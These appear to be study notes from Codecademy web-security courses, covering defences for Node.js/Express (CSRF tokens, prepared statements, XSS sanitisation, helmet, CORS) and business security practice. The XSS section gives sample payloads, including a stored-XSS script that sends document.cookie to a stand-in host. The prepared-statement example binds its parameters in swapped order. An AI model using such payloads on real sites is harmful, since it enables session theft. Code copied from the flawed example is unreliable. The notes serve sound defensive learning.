The `csurf` module provides middleware functions to help our Node.js/Express web application send and process CSRF tokens with web requests.<br>
The csurf module stores CSRF tokens within a cookie or in session. The cookie-parser module can be used to manipulate cookies.<br>
A csrf token has to be generated in the backend and send to appropriate frontend page.<br>
When a client submits a form, the form should contain a hidden <input> field containing the csrf token.<br>
The backend will afterwards compare the csrf token from submitted form with the backend generated crsf token, if those are not equal the backend will return an error.

### SQL Attacks
[SQL Injection introduction](#SQL-Injection)

One method of preventing SQL injection is to sanitize inputs. Input sanitization is a cybersecurity measure of checking, cleaning, and filtering data inputs before using them.<br>
The module `validator` can be used inside Node.js to validate and sanitize strings.<br>
It can validate different types from dates to emails with functions such as `isEmail()`, `isLength()`, `isNumeric()`, `contains()`...<br>
Data sanitization is the process of removing all dangerous characters from an input string before passing it to the SQL engine. For example, we can remove unwanted characters or spaces that might lead to a SQL injection.<br>
For example we can use `normalizeEmail()` function to remove potentially dangerous characters while keeping the email address or we can use the `escape()` function to replace <, >, &, ', and " characters that could be confused with HTML entities.

Arguably, the best technique to protect against SQL injections is a method called prepared statements. Prepared statements are predefined SQL queries that take user input and place them into placeholders not considering those as SQL just as arguments for the predefined SQL query.<br>
At least in Node.js a non-prepared statement looks like this `SELECT * FROM Employee  WHERE FirstName = ${req.body.firstName} AND LastName =  ${req.body.lastName}` while a prepared statement looks like this `"SELECT * FROM Employee  WHERE FirstName = ? AND LastName = ? ", 
  [req.body.lastName, req.body.firstName]`.<br>
Alternatively prepared statements can be written with named placeholders like this `"SELECT * FROM Employee  WHERE FirstName = $firstName AND LastName = $lastName ", { $firstName: req.body.firstName, $lastName: req.body.lastName }`.

### XSS Attacks
[XSS introduction](#XSS)

A DOM-Based XSS attack occurs when an attack payload is executed by altering the DOM in the victim’s browser.<br>
An example would be writing `<script>alert('Hacked!');</script>` inside an input that will be displayed afterward, instead of displaying the actual text the browser could execute the javascript inside the script.<br>
Alternatively `<script>alert('Hacked!');</script>` can be written inside the URL query parameters, this new URL will form a crafted URL, this crafted URL can be disguised using an URL shortener, the final disguised crafted URL with a malicious script can be send to other people during a phishing attack.<br>
Certain times protection exist against the script tags but not other tags thus alternatively javascript can be injected like this `<img src="bad_image" onerror="alert('Hacked!')">`.

In a DOM-Based XSS attack the malicious script stays client-side interacting with the frontend HTML and javascript while in a reflected XSS attack the script passes through the backend whereby the backend sends back to the user the frontend with the malicious script without storing it in the database contrary to a stored XSS attack.<br>
A XSS attack will usually be done by writing a script inside a URL query parameter that will be used by the backend. Again this link can be disguised and be part of phishing attack.<br>
A reflected XSS attack could for example send a malicious link to a victim with code that retrieves a victim’s cookies or other important information and send that information directly to the attacker’s personal server.<br>

A stored XSS attack consists of injecting a script that will be stored inside a database.<br>
For example someone writes `<script>fetch("http://localhost:5000?data=${document.cookie}")</script>` inside a public comment section. Each person that views the comment section could execute the malicious script, with this malicious script sending the cookie of the victim elsewhere.<br>

In order to securely setup a cookie in an Express server, you can use the library `express-session` to set up a session and configure the application with specific properties pertaining to cookies such as `httpOnly: true, secure: true` which will help mitigate the risk of client-side scripts accessing the protected cookie.

`helmet` is a Node.js package that consists of 15 modules related to configuring security of HTTP headers. By simply adding this package in an express app most of those modules will be configured automatically and provide additional security against certain types of attacks.<br>

Similar to SQL injections, XSS is preventable with input sanitization and application-level firewalls.<br>
Sanitization is the process of removing/replacing problematic characters with safe versions, usually libraries/modules exist that do the work for you.<br>
Rather than remove characters, we can also replace them with HTML-encoded versions of the characters. This allows us to retain the characters, but remove their capacity to affect the page’s HTML.<br>
Validation checks if the input meets a set of criteria (such as a string contains no standalone single quotation marks), whereas sanitization modifies the input to ensure that it is valid (such as removing single quotes).<br>
Look at the [SQL section](#SQL-Attacks) to learn more about sanitization and validators.

To prevent DOM-based attacks the function `eval()` or property setter `.innerHTML` should not evaluate user input as they can execute javascript. `.innerHTML` could be replaced with `.textContent` to prevent javascript code from being executed. The simplest prevention would be to avoid rendering user input. Lastly, one should validate and sanitize all user input in order to prevent any data manipulation. 

### CORS
Security policies on servers mitigate the risks associated with requesting assets hosted on different servers. The risk lies in requesting malicious assets such as a virus download.<br>
The same-origin policy is very restrictive. Under this policy, a document (i.e., like a web page) hosted on server A can only interact with other documents that are also on server A. In short, the same-origin policy enforces that documents that interact with each other have the same origin.<br>
Not having a security policy can be risky, but a security policy like same-origin is a bit too restrictive. Thankfully, there are security policies that strike a mix of both, like cross-origin, which has evolved into the cross-origin resource sharing standard, often abbreviated as CORS.

A request for a resource (like an image or a font) outside of the origin is known as a cross-origin request. Allowing cross-origin requests is helpful, as many websites today load resources from different places on the Internet (stylesheets, scripts, images, and more).<br>
CORS allows servers to specify who (i.e., which origins) can access the assets on the server and how (i.e., which HTTP request methods).

The CORS standard manages cross-origin requests by adding new HTTP headers to the standard list of headers.<br>
Multiple CORS headers exist but the most important one is the 'Access-Control-Allow-Origin' header which allows servers to specify how their resources are shared with external domains. When a GET request is made to access a resource on Server A, Server A will respond with a value for the 'Access-Control-Allow-Origin' header. Many times, this value will be \*, meaning that Server A will share the requested resources with any domain on the Internet. Other times, the value of this header may be set to a particular domain or list of domains.

When a request is made using an HTTP request that isn't GET or POST, or if any of the headers that are automatically set by your browser are modified, a standard preflight request will be made before the original request. Preflight requests use the OPTIONS header and are sent before the original request to determine the safety of the original request. If the original request is deemed unsafe it will be blocked.

Implementing the request headers to set up CORS correctly depends on the language and framework of the backend.

CORS also prevents outside individuals from making successful HTTP requests to your APIs, as this could lead to unauthorized individuals collecting hidden data.

### Javascript Defensive coding
The `eval()` function in JavaScript takes a string as an argument and executes it as Javascript source code. If it takes user input someone could inject a malicious script making the function dangerous. The functions, setInterval(), setTimeout(), and new Function() use eval() in their implementations, and should be used with the same caution.<br>
The function `safeEval()` is a safer alternative, it limits the methods and properties available to eval, for example `process.exit(0)` could not be executed by safeEval as it does not grant access to process. The safest option is to avoid eval altogether.

The `exec()` method takes a string as an argument and runs it as a shell command, enabling shell syntax within JavaScript. The danger is that unrestricted commands can access, modify, and delete files.<br>
The `execFile()` method is an alternative that works similarly to exec() but requires separation of the commands and its arguments. Whereas exec will allow for additional unintended commands in the input, execFile will detect an error. 

The file system, or fs, module in Node.js enables file system operations. It gives us access to methods like: chmod, mkdir, rmdir... One way of limiting the danger is to use `path.join(root_directory, filename)` to combine our desired directory with the user-provided file name. Hiding the directory the server is operating on, makes it tougher to reach valuable information.

Regular Expressions are used in almost every single programming language to validate whether user input adheres to an expected condition. Attackers can make use of insecure regex expressions to trigger a Regular expression Denial of Service (ReDoS). The RegEx engine can take a large amount of time on poorly defined Regex expressions.<br>
To prevent this danger, we can use the validator npm package which can validate without the need for regex. For Regex expression we must write ourselves, we can use tools like the safe-regex npm package to detect dangerous regular expressions.

To receive extra compilation errors in javascript we can write at top of file `"use strict"`, those extra compilation errors can help reveal vulnerabilities.

Static Code Analysis evaluates a code without executing it. A lint, or linter, is a static code analysis tool used to improve source code by finding and flagging programming errors, bugs, and patterns that may compromise security. Some of the most popular JavaScript linters are ESLint and JSLint.<br>
We can customize the linter rules to fit our needs using configuration files or third-party plugins. `eslint-plugin-security` is a plugin that adds rules to detect several security vulnerabilities.

### Secure your nodejs application Summary

* Prevent Cross-Site Scripting (XSS) attacks
  * Validating and sanitizing data with `express-validator`
  * `helmet` package
  * Secure cookies
  * Implementing alternative methods to prevent DOM-Based XSS attacks.
    * `.innerHTML` could be replaced with `.textContent` or avoided.
    * `eval()` could be replaced with `safeEval()` or avoided.
    * `exec()` could be replaced with `execFile()` or avoided.
    * `fs` library could be avoided or filenames could be constructed with `path.join(root_directory, filename)`
* Prevent SQL injection attacks
  * Validating and sanitizing data with `express-validator`.
  * Using prepared statements when making SQL queries.
* Prevent Cross-Site Request Forgery (CSRF) attacks
  * Implement CSRF tokens with `csurf` package.
  * Ask password before commiting important account changes.
* Setup CORS correctly

## Codecademy course - Cybersecurity for Business
### Cybersecurity team
A security team could consist of the following roles.
* The Security Operations Center, typically referred to as the “SOC”, is the function that is responsible for managing security incidents, detecting and resolving them.
  * A SOC analysist detects the threats.
  * Incident responders ward off incidents that have already taken place.
  * Forensics investigate how to prevent an incident from reoccurring.
  * Identity and access management ensures members of the organizations can access the tools they need to fulfill their responsibilities.
  * Red team is similar to ethical hackers, they try to discover vulnerabilities in their own organization's program.    
* Security Governance, Risk, and Compliance, decides what security problems to prioritize or not, it verifies the company follows the law.
  * Vulnerability management team is responsible for tracking vulnerabilities found within the company’s information systems, assisting in the remediation process, indicates what needs to be patched.
  * Architects are responsible for security architecture which refers to how security is implemented in an organization.
* Security Auditors are in charge of assessing the organization’s security posture by measuring it against industry standards, federal regulations, and recognized frameworks. We can think of audits as a big checklist of requirements that companies need to have.

Processes provide strategies that allow cybersecurity teams to implement security while adopting best practices.
* A popular strategy that many companies use is to follow a framework such as the The NIST Cybersecurity Framework. Frameworks provide a reference for cybersecurity teams to follow to identify gaps in their security architecture.
* Collaboration between different subsets of the cybersecurity team is important.

Lastly a team consists of technologies/tools used to monitor, assess, remediate and automate security processes.
* Static Application Security Testing (SAST) is a tool used to identify vulnerabilities within own code base. The Open Web Application Security Project (OWASP) has a list of popular SAST tools. This allows the development team to fix problems before the applications are made public.
* We can use a Dynamic Application Security Testing (DAST) tool to simulate cyberattacks on an application and check to see whether or not it has vulnerabilities that a real hacker can take advantage of.
* The SOC team typically manages a Security Information and Event Management system (SIEM). A SIEM can provide real-time monitoring while analyzing events through logging.
* Vulnerability Scanners: Scan networks and applications for common vulnerabilities.
* Firewalls: Prevent unauthorized access within an internal network.
* Antivirus Software: Applications that are used to detect and remove malware from a computer, network, or other system.
With every new tool, we need to create an implementation plan. These types of plans ensure that the tool is assimilated into the environment and all involved parties are trained on how to use the new tool.<br>
An implementation plan should also contain periodic assessments of the technology that is being adopted. It is never helpful to pay for a resource that is no longer being used to its full capacity. At the same time, there may be a new tool that can serve the needs of the company in a much more efficient manner.

### Employee safety
#### Account policies
Employee accounts can contain sensitive information, this should be protected through policies.

A user account policy refers to the rules around having an account in your organization.<br>
The password policy in your organization should have complexity requirements, for example employee passwords should have a certain length and use certain characters.<br>
Typically, a password policy may ask you to change passwords every 6 months or every year. Old passwords are risky because data breaches can happen at any time, and if your password is found in a data breach, it is only a matter of time before a hacker is able to log in to your account.<br>
Users that try different passwords to login can get blocked after a certain amounts of tries, this is called account lockout and can protect against brute-force attacks.<br>
Passwords cannot be shared with others, re-used, stored in tools not authorized by the company, or written down.

Account management is the practice of creating, deleting, and modifying accounts for users in an organization. Accounts have different levels of privileges, which means that some accounts are able to perform actions that other accounts can’t. Only accounts in use should exist and account privileges should not exceed what is necessary.<br>

An employee acceptable use policy (AUP) is a list of rules that employees must follow when connected to the company’s network or when using company devices.<br>
Acceptable use policies help prevent cybersecurity threats, avoid illegal or illicit activities from occurring on your network, and help maximize productivity by preventing access to certain sites during the workday.

#### Security awareness training
It’s important to always be prepared for any kind of cyber threat, and one of the most effective ways is to teach employees how they can protect themselves so that their data, as well as the company’s data, is not compromised.

Phishing emails can demand employee's password, identifying as the employee's company while they are not.<br>
One of the most common ways to establish an awareness program is to run a phishing test. A phishing test is a simulation of a real phishing attack on employees. The process of measuring that risk and implementing controls to mitigate it is a cybersecurity practice known as third-party risk management.

### Third-party risk management
A lot of companies use third party products, which are digital tools used by a software company in the application they serve to their clients. Third-party products prevent from having to recreate certain products from scratch and thus are useful but they can come with security risks.

Before using third-party tools, it is best to do its due-diligence on that product.

If we purchase a product from a vendor that has security issues, we’ll be poisoning our own environment once the vendor’s product is integrated. Also, adopting a product that isn’t compliant with federal regulations is a recipe for disaster.<br>
Products from vendors with a bad reputation is best not utilized to avoid this bad reputation for yourself.<br>
Make sure the third-party product has good performance and support available.

A common trend that has surfaced over the years is outsourcing code development. Companies hire skilled workers from countries where the cost of labor is low. Managing a team of developers in another country can result in communication breakdowns, including conflicting working styles and expectations. The biggest danger, however, is that we run a potential security risk with outsourced code. We’re entrusting the intellectual property of our company to a foreign team that may not have aligned security practices in place.

Ever since cloud technology became popular, many companies rushed to store their data in the cloud. This proved to be a cheaper and easier alternative to having your own data centers.<br>
Other third-party tools can also sometimes have access to your data.<br>
But this can come with the risk of those external services holding your data not being properly secured.

Developing a strong third-party risk management program is the first step in determining how your organization will handle new tools and technology. With an effective risk management process, your company will enjoy the benefits of adopting third-party products and services while lowering the risk that is associated with the vendor.

### Incident response playbook
The incident response playbook is a manual for how to respond to security incidents.

Before creating our playbook, we need to prepare ourselves and decide what type of incidents will be included in our playbook. We also have to decide who does what, since an understanding of roles and responsibilities is important when responding to an incident. Lastly, we’ll have to make sure that we have a plan for public relations in the event that an incident does occur.

As you draft your incident response playbook, remember to create a repeatable process. It’s helpful to create a “one size fits all” solution so that the playbook can be used to respond to any incident.<br>
Based on your research, map out specific steps that need to be taken to resolve an incident throughout its lifecycle.<br>
As you draft your playbook, try to use public resources as a guide so that you are able to create a playbook that includes recommendations from some of the top cybersecurity organizations in the world. The Computer Security Incident Handling Guide from the National Institute of Standards and Technology is a good place to start looking. Another helpful resource is the Incident Handler’s Handbook by SANS, which is a renowned cybersecurity instruction organization.

A walkthrough exercise is a real-world scenario that you can create for your team using the playbook as a guide. Walkthrough exercises are an effective way of challenging your playbook, identifying strengths and weaknesses, and evaluating its effectiveness while making changes as needed. Lastly, your incident response playbook should be tested at least twice annually so that all relevant team members are prepared to address any security incident at any given time.

An incident response refers to “everything that needs to happen to investigate and recover from an incident”. This includes preparation(prior readiness through training, access to tools), detection, analysis, remediation(the process of fixing a security issue), review(note what happened to prevent it from reoccuring).<br>
NIST is a fantastic resource for cybersecurity in general. In addition to general cybersecurity frameworks that organizations can use and adapt, NIST has a detailed guide on establishing and maintaining incident response capability.

## Free tutorials
### Other concepts
#### Hacking and ethical hacking
Hacking is the act of working within the confines of a system to produce unintended behavior.<br>
However when taking about hacking or a hacker we usually mean security hacking/hacker.<br>
A security hacker is a malicious attacker who explores methods for breaching defenses and exploiting weaknesses in a computer system or network.

Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data. Carrying out an ethical hack involves duplicating strategies and actions of malicious attackers. This practice helps to identify security vulnerabilities which can then be resolved before a malicious attacker has the opportunity to exploit them.

I also heard from an informal source certain ethical hackers that try to physically take control over an application by trying to access the server's physical location and entering in the computers.

## Resources
[codecademy - Introduction to Cybersecurity](https://www.codecademy.com/learn/introduction-to-cybersecurity)<br>
[codecademy - Cybersecurity for Business](https://www.codecademy.com/learn/cybersecurity-for-business)<br>
[codecademy - Defending Node Applications from SQL Injection, XSS, & CSRF Attacks](https://www.codecademy.com/learn/defending-express-applications-from-sql-injection-xss-csrf-attacks)
